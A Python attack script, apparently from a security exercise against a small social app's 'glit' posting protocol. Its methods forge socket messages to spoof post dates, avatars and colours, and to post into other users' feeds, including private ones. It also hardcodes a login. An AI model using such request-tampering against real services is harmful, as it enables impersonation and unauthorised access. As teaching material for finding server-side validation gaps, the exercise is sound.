import datetime
from tools import *


class Attack(tools):

    enable_push_notifications = True
    user_name = "natali2"
    password = "natali2"
    publisher_id = 8017
    user_id = 8017
    feed_owner_id = 8017
    publisher_screen_name = "natali2"
    publisher_avatar = "im2"
    background_color = "DarkOrange"
    date = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ")
    font_color = "black"
    content = "cyber cyber"
    id = -1

    
    _msg_post = {"feed_owner_id":feed_owner_id ,"publisher_id":publisher_id,
    "publisher_screen_name":publisher_screen_name,"publisher_avatar":publisher_avatar,
    "background_color":background_color,"date":date,
    "content":content,"font_color":font_color}

      
    @classmethod
    def spoof_date(cls, date = "3567-01-03T13:57:04.602Z") -> None:
        # ---------------------------------------------- #
        # This function spoofs the date of the post to a given date  
        # :param date: the date that will be seen as the date when the post was published     
        # :type date: str
        # :return: none
        # ---------------------------------------------- #

        new_msg_post = cls.get_user_info(super().server_session.user_screen_name)
        new_msg_post["date"] = date
        msg = super().build_post_msg(new_msg_post)
        super().server_session.sock.sendall(msg.encode())
        server_msg = super().server_session.sock.recv(2048).decode()
        print(f"[SERVER RESPONSE] {server_msg}")


    @classmethod
    def tampering_background_color(cls, color = "Black") -> None:
        # ---------------------------------------------- #
        # This function changes background color of a post
        # :param color: the calor of background that you would like to put
        # :type color: str
        # :return: none
        # ---------------------------------------------- #
        
        new_msg_post = cls.get_user_info(super().server_session.user_screen_name)
        new_msg_post["background_color"] = color
        msg = super().build_post_msg(new_msg_post)
        super().server_session.sock.sendall(msg.encode())
        server_msg = super().server_session.sock.recv(2048).decode()
        print(f"[SERVER RESPONSE] {server_msg}")
        


    @classmethod
    def tampering_font_color(cls, color = "Red") -> None:
        # ---------------------------------------------- #
        # This function changes font color of glit text
        # :param color: requested font color
        # :type color: str
        # :return: none
        # ---------------------------------------------- #
        
        new_msg_post = cls.get_user_info(super().server_session.user_screen_name)
        new_msg_post["font_color"] = color
        msg = super().build_post_msg(new_msg_post)
        super().server_session.sock.sendall(msg.encode())
        server_msg = super().server_session.sock.recv(2048).decode()
        print(f"[SERVER RESPONSE] {server_msg}")


    @classmethod
    def spoof_pic(cls ,img = "im6")->None:
        # ---------------------------------------------- #
        # This function spoofs the profile pic of the poster
        # :param img: the image to spoof
        # :type img: str
        # :return: none
        # ---------------------------------------------- #
        
        new_msg_post = cls.get_user_info(super().server_session.user_screen_name)
        new_msg_post["publisher_avatar"] = img
        msg = super().build_post_msg(new_msg_post)
        super().server_session.sock.sendall(msg.encode())
        server_msg = super().server_session.sock.recv(2048).decode()
        print(f"[SERVER RESPONSE] {server_msg}")


    @classmethod
    def tampering_feed(cls, feed_user_name = "natalip")-> None:
        # ---------------------------------------------- #
        # This function post glit to another feed (even private)
        # :param img: the image to spoof
        # :type img: str
        # :return: none
        # ---------------------------------------------- #
        
        new_msg_post = cls.get_user_info(super().server_session.user_screen_name)
        new_msg_post["feed_owner_id"] = super().find_user_id_by_name(super().server_session.sock, feed_user_name)
        msg = super().build_post_msg(new_msg_post)
        super().server_session.sock.sendall(msg.encode())
        server_msg = super().server_session.sock.recv(2048).decode()
        print(f"[SERVER RESPONSE] {server_msg}")

            
        
    @classmethod  
    def get_user_info(cls, name: str) -> dict:
        # ---------------------------------------------- #
        # This function gets user information about the post and built the needed dict
        # :param name: name to cheach
        # :type name: str
        # :return: dict with user info
        # :rtype: dictionary
        # ---------------------------------------------- #
        
        user_id = super().server_session.id
        new_msg_post = cls._msg_post
        new_msg_post["background_color"] = "yellow"
        new_msg_post["publisher_avatar"] = "im1"
        new_msg_post["publisher_screen_name"] = name
        new_msg_post["font_color"] = "black"
        new_msg_post["publisher_id"] = user_id
        new_msg_post["feed_owner_id"] = user_id
        new_msg_post["date"] = cls.date
        return new_msg_post
